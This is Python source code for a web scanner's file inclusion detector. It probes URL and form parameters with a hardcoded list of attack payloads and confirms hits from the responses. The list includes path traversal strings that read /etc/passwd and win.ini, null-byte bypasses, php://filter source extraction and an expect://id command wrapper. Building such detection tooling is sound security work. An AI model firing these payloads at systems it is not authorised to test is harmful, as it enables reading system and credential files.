import asyncio
import base64
import logging
import re

from app.core.detectors.base_detector import BaseDetector, Finding
from app.core.verification.verification_framework import HttpVerifier, URLParameterBuilder, FormPayloadBuilder
from app.models.vulnerability import OwaspCategory, SeverityLevel

logger = logging.getLogger(__name__)


class FileInclusionDetector(BaseDetector):
    name = "file_inclusion"

    fi_param_tokens = {
        "page", "file", "path", "include", "template", "doc", "dir", "load", "url", "src", "dest", "view"
    }

    # LFI proof-of-concept payloads paired with strict verification rules
    LFI_PAYLOADS = [
        # Linux System Files
        ("../../../../etc/passwd", r"root:x:0:0:", "Linux /etc/passwd LFI"),
        ("....//....//....//....//etc/passwd", r"root:x:0:0:", "Linux nested traversal LFI"),
        ("/etc/passwd", r"root:x:0:0:", "Linux absolute LFI"),
        ("../../../../../../../../etc/passwd", r"root:x:0:0:", "Linux deep traversal LFI"),
        ("..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", r"root:x:0:0:", "Linux URL-encoded deep traversal"),
        ("../../../../etc/passwd%00", r"root:x:0:0:", "Null-byte LFI bypass"),
        ("../../../../etc/passwd\x00.jpg", r"root:x:0:0:", "Null-byte + extension LFI bypass"),
        # Windows System Files
        ("../../../../windows/win.ini", r"\[fonts\]|\[extensions\]", "Windows win.ini LFI"),
        ("C:\\windows\\win.ini", r"\[fonts\]|\[extensions\]", "Windows absolute win.ini LFI"),
        ("..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", r"\[fonts\]|\[extensions\]", "Windows traversal LFI"),
        # PHP Wrappers (Using dynamic verification logic instead of loose regex)
        ("php://filter/convert.base64-encode/resource=index.php", "DYNAMIC_B64_CHECK", "PHP Filter Base64 LFI"),
        ("php://filter/read=convert.base64-encode/resource=../../../../etc/passwd", "DYNAMIC_B64_CHECK", "PHP Filter Base64 Traversal LFI"),
        ("php://input", "DYNAMIC_STREAM_CHECK", "PHP input stream injection"),
        ("data://text/plain;base64,U2VudHJ5VGVzdA==", r"SentryTest", "PHP data wrapper"),
        ("expect://id", r"uid=\d+", "PHP expect wrapper"),
    ]

    RFI_PAYLOADS = [
        ("http://0.0.0.0:0/sentry_rfi_test", None, "Remote HTTP include attempt"),
        ("https://0.0.0.0:0/sentry_rfi_test", None, "Remote HTTPS include attempt"),
    ]

    @staticmethod
    def _is_valid_src_code_delivery(text_content: str) -> bool:
        """
        General-purpose capability: Verifies if a string looks like source code code blocks.
        Prevents matching generic application state data.
        """
        indicators = [r"<?php", r"html", r"doctype", r"require_once", r"include(", r"$_GET", r"$_POST"]
        return any(re.search(ind, text_content, re.IGNORECASE) for ind in indicators)

    async def detect(self, urls: list[str], forms: list[object], **kwargs: object) -> list[Finding]:
        findings: list[Finding] = []
        session_cookies = kwargs.get("session_cookies") or {}

        from app.core.crawler.param_discovery import ParamDiscovery
        
        def fi_filter(param_name: str) -> bool:
            param_lower = param_name.lower()
            return param_lower in self.fi_param_tokens or any(tok in param_lower for tok in ["file", "page", "path", "inc"])
            
        candidates = ParamDiscovery.build_candidates(
            urls, forms, filter_fn=fi_filter
        )

        if not candidates:
            return []

        semaphore = asyncio.Semaphore(4)
        verifier = HttpVerifier(cookies=session_cookies)
        verifier.set_request_context(module="lfi")

        async def verify_candidate(cand) -> list[Finding]:
            if len(cand) == 5:
                cand_url, param, method, val, form_inputs = cand
            else:
                cand_url, param, method, val = cand
                form_inputs = None

            cand_findings = []

            def _build_request_args(payload: str) -> tuple[str, dict | None, dict | None]:
                if method.upper() == "POST" and form_inputs is not None:
                    data = FormPayloadBuilder.build(form_inputs, param, payload)
                    return cand_url, None, data
                return URLParameterBuilder.inject_parameter(cand_url, param, payload, method)

            async with semaphore:
                verifier.set_request_context(parameter=param)
                try:
                    baseline_url, baseline_params, baseline_data = _build_request_args(val)
                    baseline = await verifier.send_request(
                        baseline_url, method, baseline_params, baseline_data, test_phase="baseline"
                    )

                    # Hardened Engine-Specific Error Patterns (No generic 'warning' tokens)
                    rfi_error_terms = re.compile(
                        r"(failed to open stream: HTTP request failed|"
                        r"php_network_getaddresses: getaddrinfo failed|"
                        r"allow_url_include is disabled|"
                        r"java.net.MalformedURLException|java.io.FileNotFoundException)",
                        re.IGNORECASE,
                    )
                    
                    wrapper_error_terms = re.compile(
                        r"(failed to open stream: No such file or directory|"
                        r"Failed opening required|io.sentry.exception)", 
                        re.IGNORECASE
                    )
                    
                    for payload, verify_rule, desc in self.LFI_PAYLOADS:
                        # Skip payload execution if baseline naturally contains the target pattern
                        if verify_rule and verify_rule not in ["DYNAMIC_B64_CHECK", "DYNAMIC_STREAM_CHECK"]:
                            if re.search(verify_rule, baseline.body, re.I):
                                continue

                        injected_url, injected_params, injected_data = _build_request_args(payload)
                        injected = await verifier.send_request(
                            injected_url, method, injected_params, injected_data,
                            test_phase="lfi_injection", payload=payload,
                        )

                        if injected.status_code != 200:
                            continue

                        # --- Rule 1: Handling Standard File System Patterns ---
                        if verify_rule and verify_rule not in ["DYNAMIC_B64_CHECK", "DYNAMIC_STREAM_CHECK"]:
                            if re.search(verify_rule, injected.body, re.I):
                                cand_findings.append(
                                    Finding(
                                        category=OwaspCategory.a01,
                                        vuln_type="Local File Inclusion (LFI)",
                                        severity=SeverityLevel.critical,
                                        url=cand_url,
                                        parameter=param,
                                        method=method,
                                        payload=payload,
                                        evidence=f"LFI confirmed via payload '{payload}' ({desc}). Target structural pattern matched successfully.",
                                        confidence_score=95.0,
                                        detection_method="file_retrieval",
                                        reproducible=True,
                                        verified=True,
                                        verification_request_snippet=injected.request_snippet,
                                        verification_response_snippet=injected.response_snippet,
                                    )
                                )
                                break

                        # --- Rule 2: Advanced Base64 Filter Oracle Extraction ---
                        elif verify_rule == "DYNAMIC_B64_CHECK":
                            # Extract potential base64 blocks of significant length
                            b64_candidates = re.findall(r"([a-zA-Z0-9+/={4,}\s]{30,})", injected.body)
                            is_true_positive = False
                            
                            for b64_str in b64_candidates:
                                normalized_b64 = re.sub(r"\s+", "", b64_str)
                                # Pad base64 string safely if broken by string splits
                                normalized_b64 += "=" * ((4 - len(normalized_b64) % 4) % 4)
                                try:
                                    decoded_bytes = base64.b64decode(normalized_b64, validate=False)
                                    decoded_str = decoded_bytes.decode("utf-8", errors="ignore")
                                    
                                    # Cross-verify that decoded payload is structural source code, not arbitrary noise
                                    if self._is_valid_src_code_delivery(decoded_str) or "root:x:0:0:" in decoded_str:
                                        is_true_positive = True
                                        break
                                except Exception:
                                    continue
                                    
                            if is_true_positive:
                                cand_findings.append(
                                    Finding(
                                        category=OwaspCategory.a01,
                                        vuln_type="Local File Inclusion (LFI)",
                                        severity=SeverityLevel.critical,
                                        url=cand_url,
                                        parameter=param,
                                        method=method,
                                        payload=payload,
                                        evidence=f"LFI confirmed via Base64 stream decoding logic ({desc}). Decoded data contains code markers.",
                                        confidence_score=98.0,
                                        detection_method="stream_decoding_oracle",
                                        reproducible=True,
                                        verified=True,
                                        verification_request_snippet=injected.request_snippet,
                                        verification_response_snippet=injected.response_snippet,
                                    )
                                )
                                break

                        # --- Rule 3: Hardened Streams and Engine Error Signatures ---
                        elif verify_rule == "DYNAMIC_STREAM_CHECK" or verify_rule is None:
                            # Strict Check: If the payload is simply being echoed back via reflection, drop it.
                            if payload in injected.body and not wrapper_error_terms.search(injected.body):
                                continue

                            if wrapper_error_terms.search(injected.body) and not wrapper_error_terms.search(baseline.body):
                                cand_findings.append(
                                    Finding(
                                        category=OwaspCategory.a01,
                                        vuln_type="Local File Inclusion (LFI)",
                                        severity=SeverityLevel.high,
                                        url=cand_url,
                                        parameter=param,
                                        method=method,
                                        payload=payload,
                                        evidence=f"Wrapper-based stream anomaly caught via strict error map evaluation ({desc}).",
                                        confidence_score=80.0,
                                        detection_method="wrapper_error_analysis",
                                        reproducible=True,
                                        verified=True,
                                        verification_request_snippet=injected.request_snippet,
                                        verification_response_snippet=injected.response_snippet,
                                    )
                                )
                                break

                    # --- Rule 4: Remote File Inclusion Processing Loops ---
                    for payload, _, desc in self.RFI_PAYLOADS:
                        injected_url, injected_params, injected_data = _build_request_args(payload)
                        injected = await verifier.send_request(
                            injected_url, method, injected_params, injected_data,
                            test_phase="rfi_injection", payload=payload,
                        )
                        
                        # Discard if the response simply reflects the mock target URL back at us
                        if payload in injected.body and not rfi_error_terms.search(injected.body):
                            continue

                        if rfi_error_terms.search(injected.body) and not rfi_error_terms.search(baseline.body):
                            cand_findings.append(
                                Finding(
                                    category=OwaspCategory.a01,
                                    vuln_type="Remote File Inclusion (RFI)",
                                    severity=SeverityLevel.high,
                                    url=cand_url,
                                    parameter=param,
                                    method=method,
                                    payload=payload,
                                    evidence=f"RFI capability identified via native backend file engine execution errors ({desc}).",
                                    confidence_score=85.0,
                                    detection_method="remote_include_oracle",
                                    reproducible=True,
                                    verified=True,
                                    verification_request_snippet=injected.request_snippet,
                                    verification_response_snippet=injected.response_snippet,
                                )
                            )
                            break
                except Exception as e:
                    logger.error("LFI verification failed for %s param %s: %s", cand_url, param, e)
            return cand_findings

        tasks = [verify_candidate(c) for c in candidates]
        results = await asyncio.gather(*tasks)
        for res in results:
            findings.extend(res)

        await verifier.close()
        return findings